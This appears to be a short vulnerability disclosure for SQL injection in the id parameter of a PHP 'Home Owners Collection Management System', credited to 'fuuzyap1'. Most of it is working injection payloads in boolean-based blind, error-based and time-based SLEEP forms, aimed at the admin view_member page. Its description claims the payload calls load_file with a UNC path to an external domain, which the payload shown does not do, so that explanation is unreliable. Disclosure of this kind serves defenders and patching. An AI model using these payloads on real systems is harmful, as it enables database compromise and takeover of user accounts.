## [Home Owners Collection Management System](https://www.sourcecodester.com/php/15162/home-owners-collection-management-system-phpoop-free-source-code.html)
### Exploit Title:Home Owners Collection Management System - id parameter SQL injection
## [Vendor](https://www.sourcecodester.com/users/tips23)
### Exploit Author: fuuzyap1

## Description:

The id parameter appears to be vulnerable to SQL injection attacks. The payload ```page=members/view_member&id=2' OR (SELECT 9041 FROM(SELECT COUNT(*),CONCAT(0x717a7a6a71,(SELECT (ELT(9041=9041,1))),0x7176717071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'JPZH'='JPZH'``` was submitted in the id parameter. 
This payload injects a SQL sub-query that calls MySQL's load_file function with a UNC file path that references a URL on an external domain. 
The application interacted with that domain, indicating that the injected SQL query was executed.
The attacker can take account control of all accounts on this system.
Status: CRITICAL

vuln url:
```
http://localhost/admin/?page=members/view_member&id=2
```

[+] Payload:

```mysql

---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: page=members/view_member&id=2' AND 3866=3866 AND 'dhhU'='dhhU

    Type: error-based
    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: page=members/view_member&id=2' OR (SELECT 9041 FROM(SELECT COUNT(*),CONCAT(0x717a7a6a71,(SELECT (ELT(9041=9041,1))),0x7176717071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'JPZH'='JPZH

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: page=members/view_member&id=2' AND (SELECT 9083 FROM (SELECT(SLEEP(5)))NEeP) AND 'DwyE'='DwyE
---

```

## Reproduce:


## Proof and Exploit:
![image](https://user-images.githubusercontent.com/95869214/153038977-0138b5a9-1a05-470a-95ed-cf48991b6387.png)

